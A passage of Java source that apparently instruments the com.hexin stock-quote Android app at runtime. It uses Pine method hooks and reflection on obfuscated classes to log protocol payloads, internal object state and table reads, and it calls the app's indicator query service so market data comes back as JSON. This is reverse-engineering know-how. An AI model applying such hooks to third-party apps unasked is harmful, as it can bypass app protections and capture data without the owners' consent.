    private static RealtimeClassSet resolveRealtimeClassSet(ClassLoader classLoader)
            throws ClassNotFoundException, NoSuchMethodException {
        String[][] candidates = new String[][]{
                {"as9", "zr9", "zr9$c"},
                {"ro9", "qo9", "qo9$c"},
        };
        java.util.List<String> incompatible = new java.util.ArrayList<>();
        ClassNotFoundException missingClass = null;
        for (String[] names : candidates) {
            try {
                Class<?> modelClass = classLoader.loadClass(names[0]);
                Class<?> clientClass = classLoader.loadClass(names[1]);
                Class<?> callbackClass = classLoader.loadClass(names[2]);
                if (!hasRealtimeRequestModelConstructor(modelClass)) {
                    incompatible.add(names[0] + " constructors="
                            + java.util.Arrays.toString(modelClass.getDeclaredConstructors()));
                    continue;
                }
                if (!callbackClass.isInterface()) {
                    incompatible.add(names[2] + " is not an interface");
                    continue;
                }
                clientClass.getConstructor(modelClass);
                clientClass.getMethod("e", callbackClass);
                clientClass.getMethod("d");
                Log.i(TAG, "RT_CORE resolved classes model=" + names[0]
                        + " client=" + names[1] + " callback=" + names[2]);
                return new RealtimeClassSet(modelClass, clientClass, callbackClass);
            } catch (ClassNotFoundException e) {
                missingClass = e;
                incompatible.add(java.util.Arrays.toString(names) + " missing=" + e.getMessage());
            } catch (NoSuchMethodException e) {
                incompatible.add(java.util.Arrays.toString(names) + " incompatible=" + e.getMessage());
            }
        }
        if (incompatible.isEmpty() && missingClass != null) {
            throw missingClass;
        }
        throw new NoSuchMethodException(
                "no coherent realtime class set; candidates=" + incompatible);
    }

    private static boolean hasRealtimeRequestModelConstructor(Class<?> modelClass) {
        for (java.lang.reflect.Constructor<?> constructor : modelClass.getDeclaredConstructors()) {
            Class<?>[] parameterTypes = constructor.getParameterTypes();
            if (parameterTypes.length == 3
                    && parameterTypes[0] == String.class
                    && parameterTypes[1] == String.class
                    && parameterTypes[2] == String.class) {
                return true;
            }
        }
        return false;
    }

    private static Class<?> loadFirstAvailableClass(
            ClassLoader classLoader, String... classNames) throws ClassNotFoundException {
        ClassNotFoundException failure = null;
        for (String className : classNames) {
            try {
                return classLoader.loadClass(className);
            } catch (ClassNotFoundException e) {
                failure = e;
            }
        }
        throw new ClassNotFoundException(
                "none of " + java.util.Arrays.toString(classNames) + " is available",
                failure);
    }

    private static Method findTableConfigureMethod(Class<?> builderClass)
            throws NoSuchMethodException {
        java.util.List<Method> methods = new java.util.ArrayList<>();
        methods.addAll(java.util.Arrays.asList(builderClass.getMethods()));
        methods.addAll(java.util.Arrays.asList(builderClass.getDeclaredMethods()));
        for (Method method : methods) {
            Class<?>[] parameterTypes = method.getParameterTypes();
            if ("H".equals(method.getName())
                    && parameterTypes.length == 4
                    && parameterTypes[0] == int.class
                    && parameterTypes[1] == int.class
                    && parameterTypes[2].isInterface()
                    && parameterTypes[3] == String.class) {
                method.setAccessible(true);
                return method;
            }
        }
        throw new NoSuchMethodException(
                builderClass.getName() + ".H(int,int,callback,String), methods="
                        + java.util.Arrays.toString(builderClass.getDeclaredMethods()));
    }

    private static Object defaultValue(Class<?> returnType) {
        if (returnType == null || !returnType.isPrimitive() || returnType == Void.TYPE) {
            return null;
        }
        if (returnType == Boolean.TYPE) return false;
        if (returnType == Character.TYPE) return '\0';
        if (returnType == Byte.TYPE) return (byte) 0;
        if (returnType == Short.TYPE) return (short) 0;
        if (returnType == Integer.TYPE) return 0;
        if (returnType == Long.TYPE) return 0L;
        if (returnType == Float.TYPE) return 0F;
        if (returnType == Double.TYPE) return 0D;
        return null;
    }

    private static boolean unifiedResponseSucceeded(Object value) {
        if (!(value instanceof Map)) {
            return true;
        }
        Object head = ((Map<?, ?>) value).get("head");
        if (!(head instanceof Map)) {
            return true;
        }
        Object errorCode = ((Map<?, ?>) head).get("errorCode");
        return !(errorCode instanceof Number) || ((Number) errorCode).intValue() == 0;
    }

    private static String toJson(Object value) {
        return toJson(value, 0);
    }

    private static String toJson(Object value, int depth) {
        if (value == null || value == org.json.JSONObject.NULL) return "null";
        if (depth >= 12) return org.json.JSONObject.quote(String.valueOf(value));
        if (value instanceof Number || value instanceof Boolean) return String.valueOf(value);
        if (value instanceof CharSequence || value instanceof Character) {
            return org.json.JSONObject.quote(String.valueOf(value));
        }
        if (value instanceof Map) {
            StringBuilder json = new StringBuilder("{");
            boolean first = true;
            for (Map.Entry<?, ?> entry : ((Map<?, ?>) value).entrySet()) {
                if (!first) json.append(',');
                first = false;
                json.append(org.json.JSONObject.quote(String.valueOf(entry.getKey())))
                        .append(':')
                        .append(toJson(entry.getValue(), depth + 1));
            }
            return json.append('}').toString();
        }
        if (value instanceof Collection) {
            StringBuilder json = new StringBuilder("[");
            boolean first = true;
            for (Object item : (Collection<?>) value) {
                if (!first) json.append(',');
                first = false;
                json.append(toJson(item, depth + 1));
            }
            return json.append(']').toString();
        }
        if (value.getClass().isArray()) {
            StringBuilder json = new StringBuilder("[");
            int length = java.lang.reflect.Array.getLength(value);
            for (int i = 0; i < length; i++) {
                if (i > 0) json.append(',');
                json.append(toJson(java.lang.reflect.Array.get(value, i), depth + 1));
            }
            return json.append(']').toString();
        }
        return org.json.JSONObject.quote(String.valueOf(value));
    }

    private static Object currentApplication() throws Exception {
        if (appInstance != null) {
            return appInstance;
        }
        Class<?> activityThread = Class.forName("android.app.ActivityThread");
        Object application = activityThread.getMethod("currentApplication").invoke(null);
        if (application instanceof Application) {
            appInstance = (Application) application;
        }
        return application;
    }

    private static ClassLoader resolveAppClassLoader(ClassLoader fallback) {
        try {
            Object application = currentApplication();
            if (application instanceof Application) {
                ClassLoader current = ((Application) application).getClassLoader();
                if (current != null) {
                    appClassLoader = current;
                    return current;
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "App ClassLoader is not ready: " + e.getMessage());
        }
        return appClassLoader != null ? appClassLoader : fallback;
    }

    private static void hookRealTimeDataCore(ClassLoader cl) {
        if (!realTimeDataCoreHooked.compareAndSet(false, true)) {
            return;
        }
        try {
            Class<?> requestModelClass = cl.loadClass("ro9");
            for (java.lang.reflect.Constructor<?> constructor
                    : requestModelClass.getDeclaredConstructors()) {
                Pine.hook(constructor, new MethodHook() {
                    @Override public void afterCall(Pine.CallFrame callFrame) {
                        Log.i(TAG, "RT_MODEL "
                                + describeObjectFields(callFrame.thisObject, 20000));
                    }
                });
            }
            Class<?> totalClientClass = cl.loadClass("uo9");
            Method totalRequest = totalClientClass.getDeclaredMethod("request");
            Method totalReceive = totalClientClass.getDeclaredMethod(
                    "receive", cl.loadClass("com.hexin.middleware.data.StuffBaseStruct"));
            Pine.hook(totalRequest, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_CORE total.request client="
                            + System.identityHashCode(callFrame.thisObject));
                }
            });
            Pine.hook(totalReceive, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_CORE total.receive client="
                            + System.identityHashCode(callFrame.thisObject));
                }
            });

            Class<?> subscriptionClass = cl.loadClass("to9");
            Method subscriptionRequest = subscriptionClass.getDeclaredMethod("request");
            Method subscriptionReceive = subscriptionClass.getDeclaredMethod(
                    "receive", cl.loadClass("com.hexin.middleware.data.StuffBaseStruct"));
            Pine.hook(subscriptionRequest, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_CORE subscription.request client="
                            + System.identityHashCode(callFrame.thisObject));
                }
            });
            Pine.hook(subscriptionReceive, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_CORE subscription.receive client="
                            + System.identityHashCode(callFrame.thisObject));
                }
            });
            Log.i(TAG, "RT_CORE hooks installed");
        } catch (Throwable e) {
            realTimeDataCoreHooked.set(false);
            Log.e(TAG, "RT_CORE hook install failed", e);
        }
    }

    private static void hookMarketProtocolBoundary(ClassLoader cl) {
        if (!marketProtocolBoundaryHooked.compareAndSet(false, true)) {
            return;
        }
        try {
            Class<?> builderClass = cl.loadClass("ryu");
            Class<?> callbackClass = cl.loadClass("ivu");
            Method configure = builderClass.getDeclaredMethod(
                    "H", int.class, int.class, callbackClass, String.class);
            Method configureWithoutCallback = builderClass.getDeclaredMethod(
                    "G", int.class, int.class, int.class, String.class);
            Method requestType = builderClass.getDeclaredMethod("d0", int.class);
            Method dispatch = builderClass.getDeclaredMethod("a0");

            Pine.hook(configure, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    String payload = callFrame.args[3] == null
                            ? "null"
                            : redactProtocolText(String.valueOf(callFrame.args[3]));
                    Log.i(TAG, "RT_PROTOCOL configure builder="
                            + System.identityHashCode(callFrame.thisObject)
                            + " frame=" + callFrame.args[0]
                            + " page=" + callFrame.args[1]
                            + " payload=" + payload);
                }
            });
            Pine.hook(configureWithoutCallback, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    directMarketInstanceId.accumulateAndGet(
                            ((Number) callFrame.args[2]).intValue(),
                            Math::max);
                    String payload = callFrame.args[3] == null
                            ? "null"
                            : redactProtocolText(String.valueOf(callFrame.args[3]));
                    Log.i(TAG, "RT_PROTOCOL configureDirect builder="
                            + System.identityHashCode(callFrame.thisObject)
                            + " frame=" + callFrame.args[0]
                            + " page=" + callFrame.args[1]
                            + " arg2=" + callFrame.args[2]
                            + " payload=" + payload);
                }

                @Override public void afterCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_PROTOCOL configureDirect state="
                            + describeObjectFields(callFrame.thisObject, 16000));
                    if (((Number) callFrame.args[1]).intValue() == 1282) {
                        logClassShape(callFrame.thisObject.getClass());
                        logObjectFieldTypes(callFrame.thisObject);
                    }
                }
            });
            Pine.hook(requestType, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_PROTOCOL requestType builder="
                            + System.identityHashCode(callFrame.thisObject)
                            + " type=" + callFrame.args[0]);
                }
            });
            Pine.hook(dispatch, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_PROTOCOL dispatch builder="
                            + System.identityHashCode(callFrame.thisObject));
                }
            });
            logClassShape(builderClass);
            Class<?> routerClass = cl.loadClass("mzu");
            logClassShape(routerClass);
            hookDirectProtocolRouter(routerClass, cl.loadClass("mqu"));
            logClassShape(cl.loadClass("qmu"));
            logClassShape(cl.loadClass("mqu"));
            logClassShape(cl.loadClass("pmu"));
            Class<?> directBuilderClass = cl.loadClass("hzu");
            logClassShape(directBuilderClass);
            for (java.lang.reflect.Constructor<?> constructor
                    : directBuilderClass.getDeclaredConstructors()) {
                Pine.hook(constructor, new MethodHook() {
                    @Override public void beforeCall(Pine.CallFrame callFrame) {
                        Log.i(TAG, "RT_PROTOCOL hzu.constructor args="
                                + java.util.Arrays.toString(callFrame.args));
                    }
                });
            }
            Method directComplete = directBuilderClass.getDeclaredMethod("o", int.class);
            Pine.hook(directComplete, new MethodHook() {
                @Override public void beforeCall(Pine.CallFrame callFrame) {
                    Log.i(TAG, "RT_PROTOCOL hzu.complete status=" + callFrame.args[0]
                            + " state=" + describeObjectFields(callFrame.thisObject, 20000));
                }
            });
            Log.i(TAG, "RT_PROTOCOL boundary hooks installed");
        } catch (Throwable e) {
            marketProtocolBoundaryHooked.set(false);
            Log.e(TAG, "RT_PROTOCOL boundary hook install failed", e);
        }
    }

    private static void hookStuffTableReads(ClassLoader cl) {
        if (!stuffTableReadHooked.compareAndSet(false, true)) {
            return;
        }
        try {
            Class<?> tableClass = cl.loadClass("com.hexin.middleware.data.mobile.StuffTableStruct");
            Method getDataTable = tableClass.getDeclaredMethod("getDataTable");
            Pine.hook(getDataTable, new MethodHook() {
                @Override public void afterCall(Pine.CallFrame callFrame) {
                    Object data = callFrame.getResult();
                    if (data == null) return;
                    appendStuffTableCapture(callFrame.thisObject, data);
                }
            });
            Log.i(TAG, "TABLE_CAPTURE StuffTableStruct.getDataTable hook installed");
        } catch (Throwable e) {
            stuffTableReadHooked.set(false);
            Log.e(TAG, "TABLE_CAPTURE hook install failed", e);
        }
    }

    private static void hookIndicatorQueries(ClassLoader cl) {
        if (!indicatorQueryManagerHooked.compareAndSet(false, true)) return;
        try {
            Class<?> managerClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_api.IndicatorManager");
            Field instanceField = managerClass.getField("INSTANCE");
            Object manager = instanceField.get(null);
            Method getService = managerClass.getMethod("getIndicatorDataService");
            Object service = getService.invoke(manager);
            if (service == null) throw new IllegalStateException("IndicatorDataService is null");
            for (String modelClassName : new String[]{
                    "com.hexin.android.biz_securities_indicator_fetcher_model.QueryParam",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.Range",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.Indicator",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.HurricaneIndicator",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneSecuritiesSource",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneCodeSelectors"
            }) {
                try {
                    logClassShape(cl.loadClass(modelClassName));
                } catch (Throwable shapeError) {
                    Log.w(TAG, "INDICATOR_CAPTURE class shape unavailable " + modelClassName
                            + ": " + shapeError.getMessage());
                }
            }
            for (String modelClassName : new String[]{
                    "com.hexin.android.biz_securities_indicator_fetcher_model.QueryParam",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneSecuritiesSource",
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneCodeSelectors"
            }) {
                hookIndicatorModelConstructors(cl, modelClassName);
            }
            int hooked = 0;
            for (Method method : service.getClass().getMethods()) {
                if (!method.getName().startsWith("obtainClient")) continue;
                String key = method.toGenericString();
                if (hookedIndicatorClientMethods.putIfAbsent(key, true) != null) continue;
                Pine.hook(method, new MethodHook() {
                    @Override public void afterCall(Pine.CallFrame callFrame) {
                        Object client = callFrame.getResult();
                        if (client == null) return;
                        hookIndicatorClientClass(client.getClass());
                        appendIndicatorCapture("client", null,
                                "method=" + method.getName()
                                        + " args=" + java.util.Arrays.toString(callFrame.args)
                                        + " class=" + client.getClass().getName());
                    }
                });
                hooked++;
            }
            Log.i(TAG, "INDICATOR_CAPTURE manager=" + service.getClass().getName()
                    + " obtain_methods=" + hooked);
        } catch (Throwable e) {
            indicatorQueryManagerHooked.set(false);
            throw new IllegalStateException("Indicator QueryClient hook failed", e);
        }
    }

    private static String callNativeHurricaneQuery(String body, ClassLoader cl) {
        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<String> result = new AtomicReference<>();
        AtomicReference<String> error = new AtomicReference<>();
        java.util.concurrent.atomic.AtomicLong callbackVersion =
                new java.util.concurrent.atomic.AtomicLong(0L);
        AtomicReference<org.json.JSONObject> mergedData =
                new AtomicReference<>(new org.json.JSONObject());
        StringBuilder rawTables = new StringBuilder();
        try {
            org.json.JSONObject request = body == null || body.trim().isEmpty()
                    ? new org.json.JSONObject() : new org.json.JSONObject(body);
            int frameId = request.optInt("frame_id", 2312);
            int start = request.optInt("start", 0);
            int count = request.optInt("count", 5);
            String sortId = request.has("sort_indicator_id")
                    && request.isNull("sort_indicator_id")
                    ? null
                    : request.optString(
                            "sort_indicator_id", "ths-hot-data-minute-attention-rate");
            String orderName = request.has("order") && request.isNull("order")
                    ? null : request.optString("order", "DESCENDING");
            if ("null".equalsIgnoreCase(sortId)) {
                sortId = "";
            }
            if ("null".equalsIgnoreCase(orderName)) {
                orderName = "";
            }
            String httpSourceId = request.optString("http_source_id", "AStockSector");
            java.util.List<String> hurricaneIds = jsonStringList(
                    request.optJSONArray("hurricane_ids"), "cn_concept");
            java.util.List<String> hurricaneIndicatorIds = jsonStringList(
                    request.optJSONArray("hurricane_indicator_ids"), sortId);
            java.util.List<String> mobileIndicatorIds = jsonStringList(
                    request.optJSONArray("mobile_indicator_ids"), "34818");
            java.util.List<String> configuredRequiredMobileIndicatorIds = jsonStringList(
                    request.optJSONArray("required_mobile_indicator_ids"), null);
            final java.util.List<String> requiredMobileIndicatorIds =
                    configuredRequiredMobileIndicatorIds.isEmpty()
                            ? mobileIndicatorIds
                            : configuredRequiredMobileIndicatorIds;
            java.util.List<String> configuredRequiredHurricaneIndicatorIds = jsonStringList(
                    request.optJSONArray("required_hurricane_indicator_ids"), null);
            final java.util.List<String> requiredHurricaneIndicatorIds =
                    configuredRequiredHurricaneIndicatorIds.isEmpty()
                            ? hurricaneIndicatorIds
                            : configuredRequiredHurricaneIndicatorIds;
            final boolean requireAllRows = "all_required_rows".equals(
                    request.optString("completion_mode", ""));
            long settleMs = Math.max(50L, request.optLong("settle_ms", 300L));

            java.util.List<Object> explicitSecurities = new ArrayList<>();
            org.json.JSONArray securitiesJson = request.optJSONArray("securities");
            if (securitiesJson != null) {
                Class<?> securityClass = cl.loadClass(
                        "com.hexin.android.biz_quote_base_api.Security");
                java.lang.reflect.Constructor<?> securityConstructor =
                        securityClass.getDeclaredConstructor(
                                String.class, String.class, String.class);
                securityConstructor.setAccessible(true);
                for (int i = 0; i < securitiesJson.length(); i++) {
                    org.json.JSONObject security = securitiesJson.optJSONObject(i);
                    if (security == null) continue;
                    String code = security.optString("code", "");
                    String market = security.optString("market", "");
                    if (code.isEmpty() || market.isEmpty()) continue;
                    explicitSecurities.add(securityConstructor.newInstance(
                            code,
                            market,
                            security.optString("name", "")));
                }
            }

            Class<?> indicatorClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.Indicator");
            Class<?> hurricaneIndicatorClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.HurricaneIndicator");
            Class<?> formatterClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.DataFormatter");
            java.util.List<Object> indicators = new ArrayList<>();
            java.lang.reflect.Constructor<?> indicatorConstructor = indicatorClass.getConstructor(
                    String.class, String.class, Long.class, formatterClass);
            for (String indicatorId : mobileIndicatorIds) {
                indicators.add(indicatorConstructor.newInstance(
                        indicatorId, "Mobilehq1264DataSource", null, null));
            }
            java.lang.reflect.Constructor<?> hurricaneIndicatorConstructor =
                    hurricaneIndicatorClass.getConstructor(String.class, String.class,
                            String.class, String.class, Map.class, Long.class, formatterClass);
            for (String indicatorId : hurricaneIndicatorIds) {
                indicators.add(hurricaneIndicatorConstructor.newInstance(
                        indicatorId, "HurricaneDataSource", null, null, null, null, null));
            }

            Class<?> rangeClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.Range");
            Object range = rangeClass.getConstructor(int.class, int.class).newInstance(start, count);
            Class<?> hurricaneTypeClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneType");
            Class<?> orderClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.Order");
            boolean hasHurricaneType = request.has("hurricane_type");
            String hurricaneTypeName = hasHurricaneType && !request.isNull("hurricane_type")
                    ? request.optString("hurricane_type", "")
                    : null;
            Object hurricaneType;
            if (!hasHurricaneType) {
                hurricaneType = java.lang.Enum.valueOf(
                        (Class) hurricaneTypeClass, "TAG");
            } else if (hurricaneTypeName == null || hurricaneTypeName.isEmpty()
                    || "null".equalsIgnoreCase(hurricaneTypeName)) {
                hurricaneType = null;
            } else {
                hurricaneType = java.lang.Enum.valueOf(
                        (Class) hurricaneTypeClass, hurricaneTypeName);
            }
            Object order = orderName == null || orderName.isEmpty()
                    ? null : java.lang.Enum.valueOf((Class) orderClass, orderName);
            Class<?> selectorsClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneCodeSelectors");
            Object selectors;
            org.json.JSONObject selectorsJson = request.optJSONObject("selectors");
            if (selectorsJson == null || selectorsJson.length() == 0) {
                selectors = selectorsClass.getConstructor().newInstance();
            } else {
                Class<?> gsonClass = cl.loadClass("com.google.gson.Gson");
                Object gson = gsonClass.getConstructor().newInstance();
                selectors = gsonClass.getMethod("fromJson", String.class, Class.class)
                        .invoke(gson, selectorsJson.toString(), selectorsClass);
                if (selectors == null) {
                    throw new IllegalArgumentException("Unable to decode Hurricane selectors");
                }
                hydrateHurricaneSelectorTypes(selectors, selectorsJson);
            }
            Class<?> sourceClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.HurricaneSecuritiesSource");
            Object source = null;
            if (explicitSecurities.isEmpty()) {
                source = sourceClass.getConstructor(hurricaneTypeClass, List.class,
                                String.class, orderClass, String.class, Long.class,
                                String.class, selectorsClass)
                        .newInstance(hurricaneType, hurricaneIds, sortId, order,
                                httpSourceId, null, null, selectors);
            }
            Class<?> securitiesSourceClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.securities_source.SecuritiesSource");
            Class<?> sortIndicatorClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.SortIndicator");
            Class<?> queryParamClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_model.QueryParam");
            Object queryParam = queryParamClass.getConstructor(List.class, List.class,
                    sortIndicatorClass, rangeClass, securitiesSourceClass)
                    .newInstance(explicitSecurities, indicators, null, range, source);

            Class<?> managerClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_api.IndicatorManager");
            Object manager = managerClass.getField("INSTANCE").get(null);
            Object service = managerClass.getMethod("getIndicatorDataService").invoke(manager);
            Method obtainClient = null;
            for (Method candidate : service.getClass().getMethods()) {
                if ("obtainClient".equals(candidate.getName())
                        && candidate.getParameterTypes().length == 2
                        && candidate.getParameterTypes()[0] == int.class) {
                    obtainClient = candidate;
                    break;
                }
            }
            if (obtainClient == null) throw new NoSuchMethodException("obtainClient(int, Function1)");
            Object client = obtainClient.invoke(service, frameId, null);
            if (client == null) throw new IllegalStateException("QueryClient is null");
            Class<?> callbackClass = cl.loadClass(
                    "com.hexin.android.biz_securities_indicator_fetcher_api.QueryCallback");
            Object callback = Proxy.newProxyInstance(cl, new Class[]{callbackClass},
                    (proxy, method, args) -> {
                        if ("onNext".equals(method.getName()) && args != null && args.length > 0) {
                            Object table = args[0];
                            logIndicatorResultShape(table);
                            String tableDetail = describeObjectFields(table, 120000);
                            synchronized (mergedData) {
                                mergeIndicatorTableData(
                                        mergedData.get(), indicatorTableToJson(table));
                                if (request.optBoolean("include_raw", false)) {
                                    if (rawTables.length() > 0) rawTables.append("\n---\n");
                                    rawTables.append(tableDetail);
                                }
                                org.json.JSONObject responsePayload = new org.json.JSONObject();
                                responsePayload.put("success", true);
                                responsePayload.put("query", String.valueOf(queryParam));
                                responsePayload.put("data", mergedData.get());
                                if (request.optBoolean("include_raw", false)) {
                                    responsePayload.put("raw_table", rawTables.toString());
                                }
                                result.set(responsePayload.toString());
                            }
                            int expectedRows = expectedIndicatorRowCount(
                                    mergedData.get(), start, count, explicitSecurities.size());
                            boolean complete = requireAllRows
                                    ? containsIndicatorValuesForRows(
                                            mergedData.get(), requiredMobileIndicatorIds,
                                            expectedRows)
                                            && containsIndicatorValuesForRows(
                                            mergedData.get(), requiredHurricaneIndicatorIds,
                                            expectedRows)
                                    : containsIndicatorValues(
                                            mergedData.get(), requiredMobileIndicatorIds)
                                            && containsIndicatorValues(
                                            mergedData.get(), requiredHurricaneIndicatorIds);
                            if (complete) {
                                latch.countDown();
                            } else if (requireAllRows) {
                                // Completion is driven by row coverage. Slow
                                // networks keep delivering callbacks until the
                                // request timeout instead of racing a quiet timer.
                            } else if (!explicitSecurities.isEmpty()
                                    && indicatorRowCount(mergedData.get())
                                            >= explicitSecurities.size()
                                    && containsIndicatorValues(
                                            mergedData.get(), requiredMobileIndicatorIds)) {
                                // Some snapshot indicators, notably speed
                                // after market close, legitimately produce no
                                // value while the live client keeps emitting
                                // other updates. Once every requested security
                                // and required field has arrived, give optional
                                // fields one bounded final window instead of
                                // resetting the quiet timer forever.
                                new Handler(Looper.getMainLooper()).postDelayed(
                                        latch::countDown, settleMs);
                            } else {
                                long currentVersion = callbackVersion.incrementAndGet();
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    if (callbackVersion.get() == currentVersion
                                            && result.get() != null) {
                                        latch.countDown();
                                    }
                                }, settleMs);
                            }
                        } else if ("onError".equals(method.getName())) {
                            String callbackError = args == null
                                    ? "unknown" : java.util.Arrays.toString(args);
                            Log.w(TAG, "INDICATOR_DIRECT onError frameId="
                                    + frameId + " error=" + callbackError);
                            error.set(callbackError);
                            latch.countDown();
                        }
                        return null;
                    });
            Method query = client.getClass().getMethod("query", queryParamClass, callbackClass);
            Handler mainHandler = new Handler(Looper.getMainLooper());
            Object finalClient = client;
            mainHandler.post(() -> {
                try {
                    query.invoke(finalClient, queryParam, callback);
                } catch (Throwable invokeError) {
                    error.set(String.valueOf(invokeError));
                    latch.countDown();
                }
            });
            boolean completed = latch.await(
                    request.optLong("timeout_ms", 30000L), TimeUnit.MILLISECONDS);
            String response;
            if (!completed) {
                if (requireAllRows) {
                    org.json.JSONObject timeoutPayload = new org.json.JSONObject();
                    timeoutPayload.put("success", false);
                    timeoutPayload.put("error", "timeout_incomplete_rows");
                    timeoutPayload.put("query", String.valueOf(queryParam));
                    timeoutPayload.put("data", mergedData.get());
                    response = timeoutPayload.toString();
                } else {
                    response = result.get() != null
                            ? result.get()
                            : "{\"success\":false,\"error\":\"timeout\",\"query\":\""
                                    + esc(String.valueOf(queryParam)) + "\"}";
                }
            } else {
                int expectedRows = expectedIndicatorRowCount(
                        mergedData.get(), start, count, explicitSecurities.size());
                boolean hasRequiredRows = containsIndicatorValuesForRows(
                        mergedData.get(), requiredMobileIndicatorIds, expectedRows)
                        && containsIndicatorValuesForRows(
                                mergedData.get(), requiredHurricaneIndicatorIds,
                                expectedRows);
                if (requireAllRows && !hasRequiredRows) {
                    org.json.JSONObject incompletePayload = new org.json.JSONObject();
                    incompletePayload.put("success", false);
                    incompletePayload.put(
                            "error",
                            error.get() == null
                                    ? "incomplete_required_rows"
                                    : "callback_error_incomplete_rows: " + error.get());
                    incompletePayload.put("query", String.valueOf(queryParam));
                    incompletePayload.put("data", mergedData.get());
                    response = incompletePayload.toString();
                } else {
                    response = result.get() != null
                            ? result.get()
                            : "{\"success\":false,\"error\":\""
                                    + esc(error.get()) + "\"}";
                }
            }

            // The native page cancels its QueryClient when the page/query
            // lifecycle ends. A bridge request must do the same before frame
            // 2312 is reused, otherwise stale callbacks remain registered and
            // later refreshes intermittently lose their response.
            CountDownLatch cancelLatch = new CountDownLatch(1);
            mainHandler.post(() -> {
                try {
                    finalClient.getClass().getMethod("cancel").invoke(finalClient);
                } catch (Throwable cancelError) {
                    Log.w(TAG, "INDICATOR_DIRECT cancel failed: "
                            + cancelError.getMessage());
                } finally {
                    cancelLatch.countDown();
                }
            });
            cancelLatch.await(2000L, TimeUnit.MILLISECONDS);
            // QueryClient.cancel() only schedules the native unsubscribe work
            // on the App side.  The main-thread invocation returning does not
            // mean frame 2312 is reusable yet.  Without this drain window the
            // next Unified request can install its callback while Hurricane's
            // late cancel/callback is still in flight, causing the first
            // request after a Hurricane query to lose its response.
            Thread.sleep(800L);
            return response;
        } catch (Throwable e) {
            Log.e(TAG, "INDICATOR_DIRECT request failed", e);
            return "{\"success\":false,\"error\":\"" + esc(String.valueOf(e)) + "\"}";
        }
    }

    private static java.util.List<String> jsonStringList(
            org.json.JSONArray values, String defaultValue) {
        java.util.List<String> result = new ArrayList<>();
        if (values != null) {
            for (int i = 0; i < values.length(); i++) {
                String value = values.optString(i, null);
                if (value != null && !value.isEmpty()) result.add(value);
            }
        }
        if (values == null && defaultValue != null && !defaultValue.isEmpty()) {
            result.add(defaultValue);
        }
        return result;
    }

    private static void hydrateHurricaneSelectorTypes(
            Object selectors, org.json.JSONObject selectorsJson) throws Exception {
        String[] groups = new String[]{"include", "exclude", "intersection"};
        for (String group : groups) {
            org.json.JSONArray specs = selectorsJson.optJSONArray(group);
            if (specs == null || specs.length() == 0) continue;
            String getterName = "get" + Character.toUpperCase(group.charAt(0))
                    + group.substring(1);
            Object rawItems = selectors.getClass().getMethod(getterName).invoke(selectors);
            if (!(rawItems instanceof java.util.List)) continue;
            java.util.List<?> items = (java.util.List<?>) rawItems;
            for (int i = 0; i < items.size() && i < specs.length(); i++) {
                Object selector = items.get(i);
                org.json.JSONObject spec = specs.optJSONObject(i);
                if (selector == null || spec == null) continue;
                java.lang.reflect.Field typeField = null;
                Class<?> current = selector.getClass();
                while (current != null && typeField == null) {
                    try {
                        typeField = current.getDeclaredField("type");
                    } catch (NoSuchFieldException ignored) {
                        current = current.getSuperclass();
                    }
                }
                if (typeField == null) {
                    throw new NoSuchFieldException(
                            selector.getClass().getName() + ".type");
                }
                typeField.setAccessible(true);
                if (typeField.get(selector) != null) continue;
                String typeName = spec.optString("type", "");
                if (typeName.isEmpty()) continue;
                Class<?> typeClass = typeField.getType();
                Object typeValue;
                if (typeClass.isEnum()) {
                    typeValue = java.lang.Enum.valueOf((Class) typeClass, typeName);
                } else if (typeClass == String.class) {
                    typeValue = typeName;
                } else {
                    java.lang.reflect.Field constant = typeClass.getField(typeName);
                    typeValue = constant.get(null);
                }
                typeField.set(selector, typeValue);
            }
        }
    }

    private static String indicatorTableValues(Object table) {
        if (table == null) return "";
        try {
            Method getValue = table.getClass().getMethod("getValue");
            return String.valueOf(getValue.invoke(table));
        } catch (Throwable ignored) {
            return String.valueOf(table);
        }
    }

    private static void mergeIndicatorTableData(
            org.json.JSONObject target, org.json.JSONObject incoming) {
        int total = Math.max(target.optInt("total", 0), incoming.optInt("total", 0));
        try {
            target.put("total", total);
            org.json.JSONArray currentRows = target.optJSONArray("rows");
            if (currentRows == null) {
                currentRows = new org.json.JSONArray();
